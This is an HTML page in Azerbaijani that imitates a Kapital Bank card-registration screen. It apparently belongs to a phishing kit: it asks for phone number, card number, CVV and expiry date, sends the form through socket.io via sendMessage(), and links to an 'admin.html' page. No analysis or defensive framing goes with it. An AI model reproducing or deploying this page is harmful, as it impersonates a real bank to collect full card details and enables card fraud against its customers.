<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Qeydiyyat</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <button class="back-btn">←</button>
            <h1 class="title">Qeydiyyat</h1>
        </div>
        
        <div class="content">
            <div class="bank-icon">
                <img src="kapital-logo.png" alt="Kapital Bank" class="logo-img">
            </div>
            <h2 class="subtitle">Kart üzrə identifikasiya</h2>
            <p class="description">Mobil nömrəni, Kapital Bank kartının nömrəsini və PIN kodunu daxil edin.</p>
            
            <div class="form">
                <div class="input-group">
                    <svg class="icon" viewBox="0 0 24 24" fill="none">
                        <rect x="5" y="4" width="14" height="17" rx="2" stroke="currentColor" stroke-width="2"/>
                        <line x1="8" y1="8" x2="16" y2="8" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                        <line x1="8" y1="12" x2="16" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                        <line x1="8" y1="16" x2="12" y2="16" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                    <input type="text" id="phoneInput" class="input-field" placeholder="Telefon nömrəsi" value="+994">
                </div>
                
                <div class="input-group">
                    <svg class="icon" viewBox="0 0 24 24" fill="none">
                        <rect x="2" y="6" width="20" height="14" rx="2" stroke="currentColor" stroke-width="2"/>
                        <line x1="2" y1="11" x2="22" y2="11" stroke="currentColor" stroke-width="2"/>
                        <line x1="6" y1="16" x2="10" y2="16" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                    <input type="text" id="cardInput" class="input-field" placeholder="Kart nömrəsi" maxlength="19">
                    <svg class="scan-icon" viewBox="0 0 24 24" fill="none">
                        <rect x="3" y="3" width="7" height="7" rx="1" stroke="currentColor" stroke-width="2"/>
                        <rect x="14" y="3" width="7" height="7" rx="1" stroke="currentColor" stroke-width="2"/>
                        <rect x="3" y="14" width="7" height="7" rx="1" stroke="currentColor" stroke-width="2"/>
                        <rect x="14" y="14" width="7" height="7" rx="1" stroke="currentColor" stroke-width="2"/>
                    </svg>
                </div>
                
                <div class="input-group">
                    <svg class="icon" viewBox="0 0 24 24" fill="none">
                        <rect x="6" y="10" width="12" height="11" rx="2" stroke="currentColor" stroke-width="2"/>
                        <path d="M8 10V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V10" stroke="currentColor" stroke-width="2"/>
                        <circle cx="12" cy="15" r="1.5" fill="currentColor"/>
                    </svg>
                    <input type="text" id="cvvInput" class="input-field" placeholder="CVV" maxlength="3">
                </div>

                <div class="input-group">
                    <svg class="icon" viewBox="0 0 24 24" fill="none">
                        <rect x="4" y="6" width="16" height="14" rx="2" stroke="currentColor" stroke-width="2"/>
                        <line x1="4" y1="11" x2="20" y2="11" stroke="currentColor" stroke-width="2"/>
                        <line x1="9" y1="15" x2="9" y2="15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                        <line x1="12" y1="15" x2="15" y2="15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                    <input type="text" id="expiryInput" class="input-field" placeholder="İstifadə müddəti (XX/XX)" maxlength="5">
                </div>
                
                <a href="#" class="link" onclick="window.location.href='admin.html'">Kapital Bank-dan kartım yoxdur</a>
            </div>
            
            <div class="footer-text">
                "Davam et" düyməsinə basmaqla tətbiqin <a href="#" class="link-inline">istifadə şərtləri</a> ilə razılaşarsan.
            </div>
            
            <button class="submit-btn" onclick="sendMessage()">Davam etmək</button>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script src="script.js"></script>
</body>
</html>
